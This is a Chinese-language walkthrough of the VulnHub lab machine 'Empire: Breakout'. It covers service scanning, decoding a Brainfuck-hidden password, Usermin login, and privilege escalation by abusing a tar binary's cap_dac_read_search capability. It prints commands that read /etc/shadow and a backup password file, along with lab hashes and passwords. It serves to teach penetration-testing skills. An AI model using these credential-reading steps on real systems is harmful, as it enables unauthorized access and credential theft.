# Empire: Breakout

2024-5-24 https://www.vulnhub.com/entry/empire-breakout,751/

difficulty: Easy

## IP

192.168.5.30

## Scan

Open Port -> 80,139,445,10000,20000

```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
```

先看看 smb，有没有暴露信息。没有映射信息，找到了一个用户: cyber

看看 80 web 上有什么信息，默认页面是 apache，使用 gobuster 看看有什么，什么都没有。在 apache 的源码上发现了一些提示：

```
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```

是 brainfuck 的编码，进行解码为 http://www.hiencode.com/brain.html ：

```
.2uqPEfj3D<P'a-3
```

看看 10000 和 20000 端口，一个显示了 WebMin ,另一个显示了 UserMin，都是 Webmin 搭建的。

上面我们得到了一个密码，使用 webmin 默认的账户 admin 或 root，尝试登陆下 10000 和 20000 端口的系统，都不行。上面我们还枚举到一个 linux 的系统用户 cyber ，看看这个用户是不是能登陆进去。结果 cyber 可以登陆 20000 这个端口。

进入到系统后，左下角有个 Command Shell(Alt+k) 可以进入系统 shell 功能。

得到了 user flag：

```
[cyber@breakout ~]$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

寻找提权路径，sudo、suid、crontab 等都没发现信息，getcap 中发现了内容：

```
/home/cyber/tar cap_dac_read_search=ep
```

进行利用：

```
/home/cyber/tar -czf /tmp/shadow.tar.gz /etc/shadow
cd /tmp
/home/cyber/tar -zxf shadow.tar.gz
```

解压后，得到了 shadow 文件：

```
root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:99999:7:::
...
cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:99999:7:::
```

尝试破解 root 的密码，没找到明文密码。

经过进一步枚举，发现 /var/backups/.old_pass.bak 这个文件，可能里面存有 passwd，cyber 没有读取权限，继续用上面的方法读取出来：

```
cd /var/backups && /home/cyber/tar -czf /tmp/pass.tar.gz .old_pass.bak
cd /tmp && /home/cyber/tar -xzf pass.tar.gz

cyber@breakout:/tmp$ cat .old_pass.bak
Ts&4&YurgtRX(=~h
```

看看是不是 root 的密码吧，su root 切换成功：

```
root@breakout:~# cat rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```
